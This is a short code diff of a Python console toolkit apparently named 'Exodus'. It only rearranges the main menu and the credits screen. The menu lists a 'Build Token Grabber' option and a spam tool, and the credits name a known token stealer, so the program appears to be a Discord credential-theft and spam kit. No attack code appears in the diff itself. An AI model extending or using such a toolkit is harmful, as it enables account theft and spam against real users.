@@ -388,13 +388,13 @@ def XCSS():
 
 def Credits():
     System.Clear()
+    System.Title("End. . . . ")
     slow(f"""{Col.purple}
     Credits to Smug246 for Luna Token Grabber
     Creditos a Smug246 por Luna Token Grabber
 {Col.white}
-    Press enter for exit...""")
-    i()
-    exit()
+""")
+    i(f" {Col.purple}[{Col.red}*{Col.purple}] {Col.white}Presiona enter para salir..." + exit)
 
 class Exodus:
     StatusConnection(), install()
@@ -409,14 +409,14 @@ class Exodus:
              ▄▀▄▄▄▄       █  ▄▀    ▀▀▀▀    ▄▀▄▄▄▄▀    ▀▄▄▄▄▀   █▀▀▀   
              █    ▐     ▄▀  ▄▀            █     ▐              ▐      
              ▐         █    ▐             ▐                                                           
-            ╭─━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━─╮
-              [1] MSN                   [7] Credits
+            ╭─━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━─╮
+              [1] MSN                   
               [2] Build Token Grabber      
               [3] Discord Invite                 
               [4] Token Info                
-              [5] AnySpam           
+              [5] AnySpam                                       [X] Credits
               [6] Video Compressor                              [0] Exit 
-            ╰─━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━─╯                   
+            ╰─━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━─╯                   
             """[1:]
         p(Colorate.Vertical(Colors.DynamicMIX((M1, Col.purple)), (B1)))
         p()
@@ -433,7 +433,7 @@ class Exodus:
             AnySpam()
         if CH1 == '6':
             XCSS()
-        if CH1 == '7':
+        if CH1 == 'x' or CH1.upper() == 'X':
             Credits()
         if CH1 == '0':
             exit()
